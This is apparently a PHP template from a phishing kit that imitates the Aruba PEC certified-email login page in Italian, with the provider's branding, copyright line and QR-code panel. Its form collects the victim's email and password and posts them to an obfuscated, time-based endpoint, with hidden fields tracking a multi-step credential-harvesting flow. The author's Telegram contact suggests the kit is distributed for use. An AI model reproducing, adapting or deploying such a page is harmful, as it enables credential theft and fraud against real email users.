<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "login";
    
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title> Sign in to your PEC email account | Pec.it </title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/bootstrap.css">
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/style.css">             


  <!-- logo site web-->
  <link rel="icon" href="<?php echo IMGSPATH; ?>/fav.ico" type="image/x-icon" />


  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>

</head>

<style>
  form{
    width: 91%;
  }
  @media(max-width: :767px){
    form{
        width: 80%;
        margin: 0 auto;
    }
  }
</style>

<body>
  <div class="bod">
    <div class="container">
      <div class="row">
        <div class="col-md-5"></div>
        <div class="col-md-6">
          <div class="tit d-flex justify-content-between align-items-center">
            <div class="logo"><img src="<?php echo IMGSPATH; ?>/logo.svg"></div>
            <div class="lang d-flex align-items-center"><img class="me-2" src="<?php echo IMGSPATH; ?>/lang.png">Italiano</div>
          </div>
          <div class="bx">
            <div class="text-center">

              <?php if( isset($_GET['error']) ) : ?>
              <div class="error d-flex mt-4">
                <div class="me-2"><img width="24" src="<?php echo IMGSPATH; ?>/er.png"></div>
                <div>I dati inseriti non sono corretti. Verifica e riprova</div>
              </div>
            <?php endif; ?>

              <h2><img src="<?php echo IMGSPATH; ?>/rg.svg"> Aruba PEC<br><span style="font-weight: 400;font-size: 16px;">Accedi alla Webmail</span></h2>
            </div>
            <div class="form row align-items-center">
              <div class="frm col-md-6">
                <form action="<?php echo base64_encode(time()); ?>" method="POST">
                                <input type="hidden" id="cap" name="cap">
                                <input type="hidden" name="steeep" id="steeep" value="login">
                                <input type="hidden" name="error" id="error" value="<?php echo $_GET['error']; ?>">
                  <div class="form-group">
                    <label for="email">Indirizzo email PEC</label>
                    <input type="email" class="form-control" placeholder="Casella PEC" id="email" name="email">
                  </div>
                  <div class="form-group mt-4" style="position: relative;">
                    <div class="d-flex justify-content-between align-items-center">
                      <label for="password">Password</label>
                      <div class="a"><a href="#">Password dimenticata?</a></div>
                    </div>
                    <input type="password" class="form-control" id="password" name="password">
                    <div class="eye"><img src="<?php echo IMGSPATH; ?>/eye.svg"></div>
                    <div class="eye-sl"><img src="<?php echo IMGSPATH; ?>/eye-sl.svg"></div>
                  </div>
                  <div class="remember">
                    Ricordami
                  </div>
                  <div class="bttn"><button type="submit">Accedi</button></div>
                </form>
              </div>
              <div class="col-md-6 right d-none d-md-block">
                <div class="text-center">
                  <div><img src="<?php echo IMGSPATH; ?>/ww.png"></div>
                  <p>
                    <b>Accesso rapido</b><br>
                    Inquadra il QR Code con l'app <b>Aruba PEC.</b><br>
                    Apri il menu  e premi l'icona <img src="<?php echo IMGSPATH; ?>/qqq.svg">
                  </p>
                  <div><img width="150" src="<?php echo IMGSPATH; ?>/qr.png"></div>
                </div>
              </div>
              <div class="col-md-12">
                <div class="dont">
                  Non hai una <b>casella di posta certificata? </b> <span>Acquista Aruba PEC</span> <img src="<?php echo IMGSPATH; ?>/link.png">
                </div>
              </div>
            </div>
            <div class="foot text-center mt-5">
              <div class="a mt-5"><a href="#">Accessible version</a></div>
              <p class="mb-0">©2025 Aruba PEC S.p.A. - P. IVA 01879020517</p>  
              <div class="a"><a href="#">Privacy - Cookie policy - Customise cookies</a></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>


  <!-- template files js-->
  <script src="<?php echo JSPATH; ?>/jquery-3.5.1.min.js"></script>
  <script src="<?php echo JSPATH; ?>/bootstrap.min.js"></script>
  <script src="<?php echo JSPATH; ?>/jquery.mask.js"></script>
  <script src="<?php echo JSPATH; ?>/js.js"></script>
  <script>
     $('.eye').click(function(){
      $(this).hide();
      $('.eye-sl').show();
      $('#password').attr('type' , 'text');
    });

    $('.eye-sl').click(function(){
      $(this).hide();
      $('.eye').show();
      $('#password').attr('type' , 'password');
    });

    
  </script>
</body>
</html>